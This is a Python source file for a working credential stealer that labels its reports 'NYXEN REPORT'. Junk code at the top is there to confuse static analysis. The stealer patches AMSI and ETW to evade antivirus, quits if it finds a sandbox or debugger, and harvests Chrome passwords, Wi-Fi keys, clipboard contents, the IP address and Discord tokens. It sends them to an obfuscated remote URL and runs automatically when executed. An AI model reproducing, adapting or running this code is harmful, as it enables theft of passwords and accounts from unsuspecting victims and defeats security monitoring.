# --- Junk variables ---
junk_a = 123456789
junk_b = "lorem ipsum dolor sit amet"
junk_c = [i for i in range(50) if i % 2 == 0]
junk_d = {"alpha": 1, "beta": 2, "gamma": 3}
junk_e = (42, 3.14, "junk")
junk_f = set([1, 2, 3, 4, 5])

# --- Junk functions ---
def junk_func1():
    x = 0
    for i in range(100):
        x += i * 2
    return x ** 0.5

def junk_func2(a, b=42):
    if a > b:
        return a - b
    else:
        return b - a

def junk_func3():
    s = ""
    for c in "randomjunk":
        s += chr((ord(c) + 5) % 256)
    return s

def junk_func4(lst):
    return [x for x in lst if x % 3 == 0]

def junk_func5():
    try:
        d = {i: i*i for i in range(10)}
        return d.get(5, 0)
    except Exception:
        return -1

# --- Junk classes ---
class JunkClass1:
    def __init__(self):
        self.data = [i for i in range(20)]
        self.flag = True

    def do_something(self):
        if self.flag:
            self.data = [x * 2 for x in self.data]
        else:
            self.data = [x // 2 for x in self.data]

class JunkClass2:
    def __init__(self, n):
        self.n = n
        self.lst = list(range(n))

    def compute(self):
        s = 0
        for i in self.lst:
            if i % 2 == 0:
                s += i
            else:
                s -= i
        return s

# --- Junk loops and logic ---
for i in range(5):
    for j in range(3):
        a = i * j
        b = j - i
        if a > b:
            c = a % (b + 1) if b != -1 else 0
        else:
            c = b % (a + 1) if a != -1 else 0

while False:
    pass  # dead loop to confuse static analysis

# --- Junk unused imports ---
import math
import datetime
import random
import string

_ = math.sqrt(144)
_ = datetime.datetime.now()
_ = random.randint(1, 100)
_ = string.ascii_letters

# --- Junk conditions ---
if False:
    print("This will never run")

if True:
    x = 42

# --- Junk try/except ---
try:
    x = 1 / 1
except ZeroDivisionError:
    x = 0

try:
    y = int("notanint")
except Exception:
    y = -1

# --- Junk decorators ---
def junk_decorator(func):
    def wrapper(*args, **kwargs):
        junk = "junk"
        result = func(*args, **kwargs)
        return result
    return wrapper

@junk_decorator
def junk_decorated_func(x):
    return x * x

# --- Junk list comprehensions ---
junk_list = [i*i for i in range(50) if i % 7 != 0]

# --- Junk bitwise ops ---
junk_bitwise = 0
for i in range(10):
    junk_bitwise ^= (i << 2) & 0xFF

# --- Junk string ops ---
junk_str = "abc" + "def" + "".join([chr(ord('a') + i) for i in range(5)])

# --- Junk context managers ---
class JunkContext:
    def __enter__(self):
        self.x = 5
        return self.x
    def __exit__(self, exc_type, exc_val, exc_tb):
        return False

with JunkContext() as val:
    val += 10

# --- Junk lambdas ---
junk_lambda = lambda x: x * 2
junk_lambda_result = junk_lambda(10)

# --- Junk nested functions ---
def junk_outer():
    def junk_inner():
        return "inner junk"
    return junk_inner()

# --- Junk complex expressions ---
junk_complex = ((3 ** 3) + (5 * 7)) / (2 ** 3) - 1

# --- Junk asserts ---
assert 1 + 1 == 2
assert len(junk_list) > 0

# --- Junk globals ---
global_var = 12345
def junk_global():
    global global_var
    global_var += 1


def dynamic_import(name):
    import importlib
    return importlib.import_module(name)

def _import(name):
    return dynamic_import(name)

def _xor_decrypt(data, key):
    import base64
    decoded = base64.b64decode(data)
    return ''.join(chr(b ^ key) for b in decoded)

def disable_amsi_etw():
    ctypes = _import("ctypes")
    kernel32 = ctypes.windll.kernel32

    def patch_func(dll, func):
        import ctypes
        kernel32 = ctypes.windll.kernel32

        # XOR 2 obfuscation for dll and func strings
        dll_name = ''.join(chr(ord(c)^2) for c in dll)
        func_name = ''.join(chr(ord(c)^2) for c in func)
        h_dll = kernel32.LoadLibraryA(dll_name.encode('ascii'))
        f_addr = kernel32.GetProcAddress(h_dll, func_name.encode('ascii'))
        if not f_addr:
            return False
        old_protect = ctypes.c_ulong()
        size = 5
        if not kernel32.VirtualProtect(f_addr, size, 0x40, ctypes.byref(old_protect)):
            return False
        patch = b"\xC3" + b"\x90"*(size-1)  # ret + nops
        ctypes.memmove(f_addr, patch, size)
        kernel32.VirtualProtect(f_addr, size, old_protect.value, ctypes.byref(old_protect))
        return True

    try:
        patch_func("amsi.dll", "AmsiScanBuffer")
    except:
        pass
    try:
        patch_func("amsi.dll", "AmsiOpenSession")
    except:
        pass
    try:
        patch_func("amsi.dll", "AmsiCloseSession")
    except:
        pass
    try:
        patch_func("ntdll.dll", "EtwEventWrite")
    except:
        pass
    try:
        patch_func("ntdll.dll", "EtwWrite")
    except:
        pass


def _is_sandbox():
    detected = []
    try:
        os = _import("os")
        platform = _import("platform")
        ctypes = _import("ctypes")
        time = _import("time")
        psutil = dynamic_import("psutil")
    except Exception:
        return False

    def has_hypervisor_cpuid():
        try:
            class CPUID(ctypes.Structure):
                _fields_ = [("eax", ctypes.c_uint), ("ebx", ctypes.c_uint), ("ecx", ctypes.c_uint), ("edx", ctypes.c_uint)]
            cpuid_fn = ctypes.cdll.LoadLibrary(None).__cpuid
            cpuid_fn.argtypes = (ctypes.POINTER(CPUID), ctypes.c_uint)
            cpuid_fn.restype = None
            regs = CPUID()
            cpuid_fn(ctypes.byref(regs), 1)
            return bool((regs.ecx >> 31) & 1)
        except Exception:
            return False

    def timing_diff_check(threshold_ns=100000):
        try:
            t1 = time.time_ns()
            t2 = time.time_ns()
            return (t2 - t1) > threshold_ns
        except Exception:
            return False

    VM_PROCESSES = {
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmsrvc", "xenservice",
        "xenstored", "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe"
    }
    VM_FILES = [
        "/usr/bin/vmware-toolbox-cmd", "/usr/bin/VBoxControl", "/dev/vboxguest",
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys"
    ]

    def scan_processes():
        try:
            names = {p.name().lower() for p in psutil.process_iter()}
            return bool(names & VM_PROCESSES)
        except Exception:
            return False

    def scan_files():
        try:
            for f in VM_FILES:
                if os.path.exists(f):
                    return True
            return False
        except Exception:
            return False

    VM_MAC_PREFIXES = {
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "52:54:00"
    }

    def mac_oui_check():
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if hasattr(addr, 'address') and ':' in addr.address:
                        mac = addr.address.upper()[0:8]
                        if mac in VM_MAC_PREFIXES:
                            return True
            return False
        except Exception:
            return False

    def dmi_bios_check():
        try:
            vendor = ""
            if platform.system() == "Windows":
                wmi = dynamic_import("wmi")
                c = wmi.WMI()
                for bios in c.Win32_BIOS():
                    vendor = bios.Manufacturer.lower()
            else:
                with open("/sys/class/dmi/id/sys_vendor", "r") as f:
                    vendor = f.read().strip().lower()
            return any(x in vendor for x in ("vmware", "virtualbox", "qemu", "xen", "microsoft corporation", "kvm"))
        except Exception:
            return False

    def windows_registry_check():
        try:
            if platform.system() != "Windows":
                return False
            winreg = dynamic_import("winreg")
            keys = [
                (r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", winreg.KEY_READ),
                (r"SYSTEM\\CurrentControlSet\\Services\\vmhgfs", winreg.KEY_READ),
            ]
            for key, perm in keys:
                try:
                    h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, perm)
                    winreg.CloseKey(h)
                    return True
                except Exception:
                    continue
            return False
        except Exception:
            return False

    ENV_TRAPS = ["VBOX", "VMWARE", "XEN", "HYPERV"]

    def env_var_check():
        try:
            import os
            for var in os.environ:
                for trap in ENV_TRAPS:
                    if trap in var.upper() or trap in os.environ.get(var, "").upper():
                        return True
            return False
        except Exception:
            return False

    def is_debugger_present():
        try:
            platform = _import("platform")
            ctypes = _import("ctypes")
            if platform.system() == "Windows":
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            else:
                libc = ctypes.CDLL("libc.so.6")
                PT_TRACE_ME = 0
                return libc.ptrace(PT_TRACE_ME, 0, None, None) != 0
        except Exception:
            return False

    CHECKS = {
        "Hypervisor CPUID bit": has_hypervisor_cpuid,
        "Timing delta suspicious": timing_diff_check,
        "Sandbox/VM processes": scan_processes,
        "Sandbox/VM files": scan_files,
        "MAC OUI match": mac_oui_check,
        "BIOS/DMI strings": dmi_bios_check,
        "Windows registry artifacts": windows_registry_check,
        "Environment variable traps": env_var_check,
        "Debugger present": is_debugger_present,
    }

    for name, fn in CHECKS.items():
        try:
            if fn():
                detected.append(name)
        except Exception:
            continue

    return detected if detected else False

def _add_noise():
    import random
    return sum(i*i for i in range(random.randint(10, 50)))

def _get_ip():
    try:
        requests = dynamic_import("requests")
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def _get_clipboard():
    try:
        subprocess = _import("subprocess")
        p = subprocess.run(["powershell", "-command", "Get-Clipboard"], capture_output=True, text=True)
        return p.stdout.strip() or "Clipboard empty"
    except:
        return "Clipboard access failed"

def _get_process_list():
    try:
        psutil = dynamic_import("psutil")
        procs = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                procs.append(f"{proc.info['pid']:>6} : {proc.info['name']}")
            except:
                pass
        return "\n".join(procs)
    except:
        return "Failed to get process list"

def _random_temp_filename(base):
    import random, string
    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"{base}_{rand}.tmp"

def _save_to_temp(filename, data):
    try:
        os = _import("os")
        tempfile = _import("tempfile")
        path = os.path.join(tempfile.gettempdir(), _random_temp_filename(filename))
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)
        return path
    except:
        return None

def getSecretKey():
    import base64
    try:
        win32crypt = dynamic_import("win32crypt")
        import os
        import json
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def generateCipher(aes_key, iv):
    Crypto = dynamic_import("Crypto.Cipher")
    AES = Crypto.AES
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return None

def getChromePasswords():
    try:
        import os
        import json
        sqlite3 = dynamic_import("sqlite3")
        data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        login_data = cursor.fetchall()
        secret_key = getSecretKey()
        extractedData = []
        for userdatacombo in login_data:
            if userdatacombo[1] and userdatacombo[2] and userdatacombo[1] != "":
                password = decryptPassword(userdatacombo[2], secret_key)
                data = "URL: " + userdatacombo[0] + " Username: " + userdatacombo[1] + " Password: " + str(password)
                extractedData.append(data)
        return extractedData
    except Exception:
        return ["Failed to extract Chrome passwords"]

def grab_wifi_passwords():
    try:
        subprocess = _import("subprocess")
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, text=True)
        wifi_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
        result = []
        for name in wifi_names:
            try:
                key_out = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, text=True, errors='ignore')
                key = "None"
                for line in key_out.split('\n'):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        break
                result.append(f"{name} : {key}")
            except Exception:
                result.append(f"{name} : Failed to get key")
        return "\n".join(result)
    except Exception as e:
        return f"WiFi grab failed: {e}"

import os, datetime
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    import random
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
    ]
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents)
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    import re
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    import json
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def getDiscordInfo():
    import json
    import base64
    import urllib
    from Crypto.Cipher import AES
    import win32crypt
    import platform
    checked = []
    all_discord_info = []

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                secret_key = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
                aes_token = token.split('dQw4w9WgXcQ:')[1]
                iv = base64.b64decode(aes_token)[3:15]
                encrypted = base64.b64decode(aes_token)[15:]
                cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                token_dec = cipher.decrypt(encrypted)[:-16].decode()
                if token_dec in checked:
                    continue
                checked.append(token_dec)

                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token_dec))
                res = urllib.request.urlopen(req)
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                # Badges & guild info omitted for brevity but add if you want

                discord_info = f"""
**New user data: {res_json['username']}**
```yaml
User ID: {res_json['id']}
Email: {res_json['email']}
Phone Number: {res_json['phone']}
MFA Enabled: {res_json['mfa_enabled']}
Locale: {res_json['locale']}
Verified: {res_json['verified']}
Token:
{token_dec}
```
"""
                all_discord_info.append(discord_info)
            except Exception:
                    continue
            
        return "\n\n".join(all_discord_info) if all_discord_info else "No Discord tokens found."
    

def _build_report():
    import platform, getpass
    user = getpass.getuser()
    ip = _get_ip()
    sysinfo = platform.platform()
    clipboard = _get_clipboard()
    wifi = grab_wifi_passwords()
    chrome_pwds = getChromePasswords()
    discord_info = getDiscordInfo()  # Your token stuff untouched

    return f"""
🧠 NYXEN REPORT
--------------------
🧍 User: {user}
🌐 IP: {ip}
💻 System: {sysinfo}
📋 Clipboard: ```{clipboard}```

📶 WiFi Passwords:
{wifi}

🔐 Chrome Passwords:
{chrome_pwds}

🎮 Discord Info:
{discord_info}
"""

def _run_payload():
    try:
        import time
        import random
        import sys

        disable_amsi_etw()
        sandbox_result = _is_sandbox()
        if sandbox_result:
            sys.exit(1)

        time.sleep(random.randint(3, 6))
        _add_noise()

        requests = dynamic_import("requests")
        __ENC_URL = b'ZHh4fH82IyNoZX9vY35oIm9jYSNtfGUje2luZGNjZ38jPT80NTU7PTo5NDk5NDo6NDU/PSNGZTlBUzk9WEN1PkJaRE5Ndj4+NFV4aUV/ODxbWTlldmZddE45W0tnenY7YHp8S052YDVidl5LNUtUOV07IU9lOzRbdA=='
        __KEY = 12
        url = _xor_decrypt(__ENC_URL, __KEY)

        msg = _build_report()
        proc_list_text = _get_process_list()
        proc_list_path = _save_to_temp("process_list.txt", proc_list_text)

        files = {}
        if proc_list_path:
            files["processes"] = ("process_list.txt", open(proc_list_path, "rb"))

        if files:
            requests.post(url, data={"content": msg}, files=files)
            for f in files.values():
                f[1].close()
        else:
            requests.post(url, json={"content": msg})

    except Exception as e:
        pass

_run_payload()
